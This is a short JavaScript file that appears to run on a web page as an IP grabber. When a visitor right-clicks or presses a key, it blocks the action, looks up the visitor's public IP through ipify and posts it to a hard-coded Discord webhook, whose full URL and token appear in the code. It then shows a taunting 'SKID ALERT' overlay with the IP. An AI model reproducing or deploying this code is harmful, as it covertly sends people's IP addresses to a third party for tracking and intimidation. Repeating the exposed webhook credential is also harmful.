const discordWebhookUrl = 'https://discord.com/api/webhooks/1258277402639990805/8U6h3LyZLz-qvOW8O1m6eIH-yoqj96vEZUHpTmy1fwXQGxLLK8rRGaDBMbopidUC5oFo';

async function fetchIPv4() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ipAddress = data.ip;

        const payload = {
            content: `New IP Address Detected: ${ipAddress}`
        };
        const webhookResponse = await fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        if (!webhookResponse.ok) {
            throw new Error(`Failed to send IP to Discord: ${webhookResponse.status} - ${webhookResponse.statusText}`);
        }

        return ipAddress;
    } catch (error) {
        console.error('Error fetching IP and sending to Discord:', error);
        return 'Unknown IPv4';
    }
}

async function flash() {
    const flashOverlay = document.getElementById('flashOverlay');
    const flashText = document.getElementById('flashText');
    
    flashOverlay.style.display = 'block';
    flashText.style.display = 'block';

    const ipv4Address = await fetchIPv4();
    flashText.innerHTML = `Your IPv4: ${ipv4Address} SKID ALERT`;
}

function handleEvent(event) {
    event.preventDefault();
    
    flash();
}

window.addEventListener('contextmenu', handleEvent);
window.addEventListener('keydown', handleEvent);